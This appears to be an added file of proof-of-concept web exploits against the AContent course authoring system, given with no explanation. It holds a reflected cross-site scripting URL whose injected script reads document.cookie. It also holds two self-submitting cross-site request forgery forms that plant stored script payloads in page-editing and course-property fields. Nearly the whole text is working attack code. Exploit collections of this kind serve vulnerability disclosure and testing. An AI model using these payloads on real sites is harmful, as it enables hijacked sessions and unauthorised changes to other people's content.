@@ -1,0 +1,45 @@
+http://www.example.com/home/search.php?search_text=txt&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&catid=&search=Search
+
+
+&lt;form action=&quot;http://www.example.com/home/editor/edit_content.php?_cid=PAGE_ID&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;_course_id&quot; value=&quot;54&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;_cid&quot; value=&quot;PAGE_ID&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;page title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ordering&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;alternatives&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;current_tab&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;keywords&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;test_message&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;sbmtit&quot; value=&quot;Save&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;displayhead&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;displaypaste&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;complexeditor&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;atest ah&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;formatting&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;head&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uploadedfile_paste&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;body_text&quot; value='hello world html&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;weblink_text&quot; value=&quot;&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('sbmtit').click();
+&lt;/script&gt;
+
+
+&lt;form action=&quot;http://www.example.com/home/course/course_property.php?_course_id=COURSE_ID&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;_course_id&quot; value=&quot;COURSE_ID&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;Creating Lesson in AContent&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;category_id&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pri_lang&quot; value=&quot;en&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value=&quot;Learn how to&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;copyright&quot; value='1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;sbmtit&quot; value=&quot;Save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('sbmtit').click();
+&lt;/script&gt;
